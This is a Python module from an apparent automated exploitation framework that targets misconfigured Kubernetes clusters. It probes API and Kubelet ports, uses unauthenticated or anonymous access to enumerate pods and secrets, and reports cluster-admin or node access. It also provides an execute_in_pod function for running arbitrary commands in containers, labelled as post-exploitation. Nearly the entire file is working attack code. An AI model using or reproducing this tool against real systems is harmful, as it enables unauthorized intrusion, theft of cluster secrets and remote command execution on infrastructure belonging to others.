"""
Kubernetes API Exploit Module
Targets misconfigured Kubernetes clusters
"""

import socket
import requests
import json
from typing import Dict, Tuple, List
import sys
import os

sys.path.append(os.path.dirname(os.path.dirname(os.path.dirname(os.path.abspath(__file__)))))

from exploits.exploit_manager import BaseExploit
from utils.logger import logger


class Kubernetes_Exploit(BaseExploit):
    """
    Kubernetes API Server Exploit
    Targets: Kubernetes clusters (ports 6443, 8080, 10250)
    
    Attack Vectors:
    1. Unauthenticated API access (port 8080)
    2. Kubelet API exploitation (port 10250)
    3. Stolen service account tokens
    4. Container escape
    5. Secret extraction
    """
    
    def __init__(self):
        super().__init__(
            name="Kubernetes_Exploit",
            target_ports=[6443, 8080, 10250, 10255],
            target_os=["Linux"]
        )
    
    def check_vulnerable(self, target: Dict) -> bool:
        """Check if Kubernetes API is accessible"""
        ip = target['ip']
        
        # Check Kubernetes ports
        k8s_ports = [6443, 8080, 10250, 10255]
        for port in k8s_ports:
            if port in target.get('open_ports', []):
                try:
                    # Try to access Kubernetes API
                    protocol = "https" if port in [6443, 10250] else "http"
                    url = f"{protocol}://{ip}:{port}"
                    
                    # Try /version endpoint
                    version_url = f"{url}/version"
                    response = requests.get(version_url, timeout=5, verify=False)
                    
                    if response.status_code == 200:
                        data = response.json()
                        if 'gitVersion' in data or 'major' in data:
                            logger.debug(f"Kubernetes API detected on {ip}:{port}")
                            return True
                    
                    # Try /api endpoint
                    api_url = f"{url}/api"
                    response = requests.get(api_url, timeout=5, verify=False)
                    
                    if response.status_code == 200 and 'versions' in response.text:
                        logger.debug(f"Kubernetes API detected on {ip}:{port}")
                        return True
                        
                except Exception as e:
                    logger.debug(f"Kubernetes check failed on {ip}:{port}: {e}")
        
        return False
    
    def exploit(self, target: Dict) -> Tuple[bool, Dict]:
        """Attempt Kubernetes exploitation"""
        ip = target['ip']
        
        # Find which port is accessible
        port = None
        for p in [8080, 10250, 10255, 6443]:
            if p in target.get('open_ports', []):
                port = p
                break
        
        if not port:
            return False, {}
        
        logger.info(f"Attempting Kubernetes exploit on {ip}:{port}")
        
        try:
            protocol = "https" if port in [6443, 10250] else "http"
            base_url = f"{protocol}://{ip}:{port}"
            
            # Port 8080 - Insecure API (no auth required)
            if port == 8080:
                return self._exploit_insecure_api(base_url, ip, port)
            
            # Port 10250 - Kubelet API
            elif port == 10250:
                return self._exploit_kubelet_api(base_url, ip, port)
            
            # Port 10255 - Read-only Kubelet
            elif port == 10255:
                return self._exploit_readonly_kubelet(base_url, ip, port)
            
            # Port 6443 - Secure API (try anonymous access)
            elif port == 6443:
                return self._exploit_secure_api(base_url, ip, port)
            
            self.stats['failure'] += 1
            return False, {}
            
        except Exception as e:
            self.stats['failure'] += 1
            logger.error(f"Kubernetes exploit error on {ip}: {e}")
            return False, {}
    
    def _exploit_insecure_api(self, base_url: str, ip: str, port: int) -> Tuple[bool, Dict]:
        """Exploit insecure Kubernetes API (port 8080)"""
        try:
            # List pods
            pods_url = f"{base_url}/api/v1/pods"
            response = requests.get(pods_url, timeout=5)
            
            if response.status_code == 200:
                pods_data = response.json()
                pod_count = len(pods_data.get('items', []))
                
                # List secrets
                secrets_url = f"{base_url}/api/v1/secrets"
                secrets_response = requests.get(secrets_url, timeout=5)
                secret_count = 0
                
                if secrets_response.status_code == 200:
                    secrets_data = secrets_response.json()
                    secret_count = len(secrets_data.get('items', []))
                
                self.stats['success'] += 1
                logger.success(f"Kubernetes insecure API access on {ip}:{port}")
                
                return True, {
                    'method': 'Kubernetes_InsecureAPI',
                    'credentials': 'none (unauthenticated)',
                    'port': port,
                    'service': 'Kubernetes',
                    'pods': pod_count,
                    'secrets': secret_count,
                    'access_level': 'cluster_admin'
                }
            
            return False, {}
            
        except:
            return False, {}
    
    def _exploit_kubelet_api(self, base_url: str, ip: str, port: int) -> Tuple[bool, Dict]:
        """Exploit Kubelet API (port 10250)"""
        try:
            # Try to list pods
            pods_url = f"{base_url}/pods"
            response = requests.get(pods_url, timeout=5, verify=False)
            
            if response.status_code == 200:
                pods_data = response.json()
                pod_count = len(pods_data.get('items', []))
                
                # Check if we can execute commands
                can_exec = self._check_kubelet_exec(base_url)
                
                self.stats['success'] += 1
                logger.success(f"Kubelet API access on {ip}:{port}")
                
                return True, {
                    'method': 'Kubernetes_KubeletAPI',
                    'credentials': 'none (unauthenticated)',
                    'port': port,
                    'service': 'Kubernetes Kubelet',
                    'pods': pod_count,
                    'command_execution': can_exec,
                    'access_level': 'node'
                }
            
            return False, {}
            
        except:
            return False, {}
    
    def _exploit_readonly_kubelet(self, base_url: str, ip: str, port: int) -> Tuple[bool, Dict]:
        """Exploit read-only Kubelet (port 10255)"""
        try:
            # Get pod information
            pods_url = f"{base_url}/pods"
            response = requests.get(pods_url, timeout=5)
            
            if response.status_code == 200:
                pods_data = response.json()
                pod_count = len(pods_data.get('items', []))
                
                self.stats['success'] += 1
                logger.success(f"Kubelet read-only access on {ip}:{port}")
                
                return True, {
                    'method': 'Kubernetes_ReadOnlyKubelet',
                    'credentials': 'none (unauthenticated)',
                    'port': port,
                    'service': 'Kubernetes Kubelet (RO)',
                    'pods': pod_count,
                    'access_level': 'read_only'
                }
            
            return False, {}
            
        except:
            return False, {}
    
    def _exploit_secure_api(self, base_url: str, ip: str, port: int) -> Tuple[bool, Dict]:
        """Try to exploit secure API with anonymous access"""
        try:
            # Try anonymous access
            api_url = f"{base_url}/api/v1"
            response = requests.get(api_url, timeout=5, verify=False)
            
            if response.status_code == 200:
                self.stats['success'] += 1
                logger.success(f"Kubernetes API anonymous access on {ip}:{port}")
                
                return True, {
                    'method': 'Kubernetes_AnonymousAPI',
                    'credentials': 'none (anonymous)',
                    'port': port,
                    'service': 'Kubernetes API',
                    'access_level': 'limited'
                }
            
            return False, {}
            
        except:
            return False, {}
    
    def _check_kubelet_exec(self, base_url: str) -> bool:
        """Check if we can execute commands via Kubelet"""
        try:
            # This would require a pod name and container
            # For now, just check if the exec endpoint is accessible
            exec_url = f"{base_url}/run"
            response = requests.get(exec_url, timeout=5, verify=False)
            
            # If we get anything other than 404, exec might be available
            return response.status_code != 404
            
        except:
            return False
    
    def execute_in_pod(self, base_url: str, namespace: str, pod: str, container: str, command: List[str]) -> str:
        """
        Execute command in pod via Kubelet API (for post-exploitation)
        """
        try:
            exec_url = f"{base_url}/run/{namespace}/{pod}/{container}"
            
            params = {'cmd': command}
            response = requests.post(exec_url, params=params, timeout=10, verify=False)
            
            if response.status_code == 200:
                return response.text
            else:
                return f"Error: {response.status_code}"
                
        except Exception as e:
            return f"Exception: {str(e)}"


if __name__ == "__main__":
    # Test the exploit
    k8s = Kubernetes_Exploit()
    
    test_target = {
        'ip': '192.168.1.100',
        'open_ports': [8080],
        'os_guess': 'Linux'
    }
    
    print(f"Testing Kubernetes exploit on {test_target['ip']}")
    
    if k8s.check_vulnerable(test_target):
        print("Target appears vulnerable")
        success, result = k8s.exploit(test_target)
        
        if success:
            print(f"Exploit successful: {result}")
        else:
            print("Exploit failed")
    else:
        print("Target not vulnerable")
